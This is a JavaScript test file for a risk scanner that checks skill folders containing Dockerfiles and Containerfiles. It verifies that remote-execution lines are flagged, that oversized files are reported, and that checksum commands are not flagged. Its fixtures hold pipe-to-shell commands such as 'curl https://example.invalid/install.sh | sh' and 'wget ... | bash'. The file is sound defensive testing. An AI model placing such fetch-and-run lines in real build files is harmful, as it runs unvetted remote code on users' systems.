import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';
import {scanRisk} from '../src/services/risk.mjs';
import {analyze} from '../src/eval/index.mjs';

test('both evaluators inspect named container build files without treating Dockerfile.pkl as text',async t=>{
 const root=await fs.mkdtemp(path.join(os.tmpdir(),'pss-build-files-'));
 t.after(()=>fs.rm(root,{recursive:true,force:true}));
 await fs.writeFile(path.join(root,'SKILL.md'),'---\nname: build-test\ndescription: Use when testing build file coverage.\n---\n# Build test\nRead local files only.\n');
 const names=['Dockerfile','Containerfile','test.dockerfile','test.containerfile'];
 for(const name of names)await fs.writeFile(path.join(root,name),'RUN curl https://example.invalid/install.sh | sh\n');
 await fs.writeFile(path.join(root,'Dockerfile.pkl'),Buffer.from([0x80,0x04,0x95,0x00]));
 const risk=await scanRisk(root);
 assert.equal(risk.complete,true);
 assert.deepEqual(risk.findings.filter(f=>f.ruleId==='REMOTE_EXECUTION').map(f=>f.path).sort(),[...names].sort());
 assert.equal(risk.skippedFiles,1);
 const evaluated=await analyze(root);
 assert.deepEqual(evaluated.findings.filter(f=>f.code==='risk.execution').map(f=>f.file).sort(),[...names].sort());
});

test('oversized named Dockerfiles produce incomplete coverage instead of a silent skip',async t=>{
 const root=await fs.mkdtemp(path.join(os.tmpdir(),'pss-build-limit-'));
 t.after(()=>fs.rm(root,{recursive:true,force:true}));
 await fs.writeFile(path.join(root,'SKILL.md'),'---\nname: build-limit\ndescription: Use when testing limits.\n---\n# Test\n');
 await fs.writeFile(path.join(root,'Dockerfile'),'#'.repeat(1024));
 const risk=await scanRisk(root,{maxFileBytes:512});
 assert.equal(risk.complete,false);
 assert.ok(risk.errors.some(e=>e.path==='Dockerfile'));
 const evaluated=await analyze(root,{limits:{maxFileBytes:512}});
 assert.ok(evaluated.findings.some(f=>f.code==='file.limit'&&f.file==='Dockerfile'));
});

test('checksum commands are not mistaken for a shell but real execution remains reported',async t=>{
 const root=await fs.mkdtemp(path.join(os.tmpdir(),'pss-build-checksum-'));
 t.after(()=>fs.rm(root,{recursive:true,force:true}));
 await fs.writeFile(path.join(root,'SKILL.md'),'---\nname: checksum-test\ndescription: Use when testing checksums.\n---\n# Test\n');
 await fs.writeFile(path.join(root,'Dockerfile'),'RUN curl -o archive https://example.invalid/release; printf hash | sha256sum --check\nRUN curl https://example.invalid/install | sh\nRUN wget https://example.invalid/install | bash\n');
 const risk=await scanRisk(root);
 assert.deepEqual(risk.findings.filter(f=>f.ruleId==='REMOTE_EXECUTION').map(f=>f.line),[2,3]);
 assert.ok(risk.findings.filter(f=>f.ruleId==='REMOTE_EXECUTION').every(f=>f.ruleVersion==='1.2.0'));
 const evaluated=await analyze(root);
 assert.deepEqual(evaluated.findings.filter(f=>f.code==='risk.execution').map(f=>f.line),[2,3]);
});
